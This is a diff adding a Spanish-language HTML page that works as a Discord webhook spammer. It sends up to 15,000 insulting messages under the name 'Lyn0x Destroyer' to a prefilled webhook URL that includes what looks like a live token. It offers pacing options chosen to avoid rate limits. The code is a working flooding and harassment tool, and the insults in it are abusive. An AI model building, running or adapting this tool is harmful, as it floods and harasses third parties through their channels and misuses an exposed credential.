@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>SPAMMER RÁPIDO Y SEGURO - Lyn0x Style</title>
+  <style>
+    body { font-family: Arial; text-align: center; background: #000; color: #f00; padding: 50px; }
+    h1 { font-size: 4em; text-shadow: 0 0 10px #f00; }
+    input { width: 80%; max-width: 600px; padding: 15px; font-size: 1.2em; margin: 20px; }
+    select { padding: 10px; font-size: 1.2em; margin: 10px; }
+    button { padding: 20px 60px; font-size: 2em; background: #f00; color: white; border: none; cursor: pointer; border-radius: 10px; }
+    button:hover { background: #c00; }
+    #status { margin-top: 30px; font-size: 1.5em; }
+    #counter { font-size: 2em; color: #0f0; }
+  </style>
+</head>
+<body>
+  <h1>LYN0X TE VA A JODER PENDEJO SIN MATAR EL WEBHOOK</h1>
+  
+  <input type="text" id="webhookInput" placeholder="Pega tu webhook aquí" value="https://discord.com/api/webhooks/1477922005591265407/iyrt9vH0WtVc9gDKJBot4EQpB26r6xA9WjKJhmCVCt8ceRd2VMqXbHWyMzl4PgQxGETk">
+  
+  <br>
+  <label for="cantidad">Cantidad de mensajes (desde 1 hasta 15k, en pasos):</label>
+  <select id="cantidad">
+    <option value="1">1 mensaje</option>
+    <option value="750">750 mensajes</option>
+    <option value="1500">1500 mensajes</option>
+    <option value="2250">2250 mensajes</option>
+    <option value="3000">3000 mensajes</option>
+    <option value="3750">3750 mensajes</option>
+    <option value="4500">4500 mensajes</option>
+    <option value="5250">5250 mensajes</option>
+    <option value="6000">6000 mensajes</option>
+    <option value="6750">6750 mensajes</option>
+    <option value="7500">7500 mensajes</option>
+    <option value="8250">8250 mensajes</option>
+    <option value="9000">9000 mensajes</option>
+    <option value="9750">9750 mensajes</option>
+    <option value="10500">10500 mensajes</option>
+    <option value="11250">11250 mensajes</option>
+    <option value="12000">12000 mensajes</option>
+    <option value="12750">12750 mensajes</option>
+    <option value="13500">13500 mensajes</option>
+    <option value="14250">14250 mensajes</option>
+    <option value="15000">15000 mensajes</option>
+  </select>
+  
+  <br>
+  <label for="velocidad">Velocidad (para no matar el webhook):</label>
+  <select id="velocidad">
+    <option value="lento">Lento (1 msg cada 1 seg - más seguro, no muere rápido)</option>
+    <option value="medio">Medio (1 msg cada 0.5 seg - balanceado)</option>
+    <option value="rapido">Rápido (1 msg cada 0.2 seg - riesgoso, puede morir en minutos)</option>
+  </select>
+  
+  <br>
+  <button onclick="startSpam()">COMENZAR SPAM</button>
+  
+  <div id="status">Esperando...</div>
+  <div id="counter">Enviados: 0</div>
+
+  <script>
+    let count = 0;
+    let totalToSend = 0;
+    let intervalId = null;
+    let isRunning = false;
+    let delayMs = 1000;  // default lento
+
+    const mensaje = "Hijo de perra skidding malparido de mierda, estafador estúpido, ya valiste verga pendejo de mierda. Aprende a no skidear, basura. Lyn0x te vio alv pendejo de mrd";
+
+    async function enviar() {
+      const webhook = document.getElementById("webhookInput").value.trim();
+      if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
+        alert("Webhook inválido, pendejo. Pégalo bien.");
+        stopSpam();
+        return;
+      }
+
+      try {
+        const res = await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: mensaje,
+            username: "Lyn0x Destroyer",
+            avatar_url: "" // pon una URL de imagen troll si quieres
+          })
+        });
+
+        count++;
+        document.getElementById("counter").innerText = `Enviados: ${count} / ${totalToSend}`;
+
+        if (!res.ok) {
+          document.getElementById("status").innerText = `Falló (código ${res.status}) - Probable rate limit o webhook muerto`;
+          stopSpam();
+        }
+
+        if (count >= totalToSend) {
+          stopSpam();
+          document.getElementById("status").innerText = "Spam completado!";
+        }
+      } catch (err) {
+        document.getElementById("status").innerText = "Error de conexión - webhook muerto o bloqueado";
+        stopSpam();
+      }
+    }
+
+    function startSpam() {
+      if (isRunning) return;
+      isRunning = true;
+      count = 0;
+
+      totalToSend = parseInt(document.getElementById("cantidad").value);
+
+      const vel = document.getElementById("velocidad").value;
+      if (vel === "lento") delayMs = 1000;  // 1 msg/seg
+      else if (vel === "medio") delayMs = 500;  // 2 msg/seg
+      else if (vel === "rapido") delayMs = 200;  // 5 msg/seg
+
+      document.getElementById("status").innerText = `Spameando ${totalToSend} msgs a velocidad ${vel}...`;
+      document.getElementById("counter").innerText = `Enviados: ${count} / ${totalToSend}`;
+
+      intervalId = setInterval(enviar, delayMs);
+    }
+
+    function stopSpam() {
+      if (intervalId) clearInterval(intervalId);
+      isRunning = false;
+      document.getElementById("status").innerText = "Parado (puedes detener manualmente con ESC)";
+    }
+
+    // Para parar manualmente
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") stopSpam();
+    });
+  </script>
+</body>
+</html>
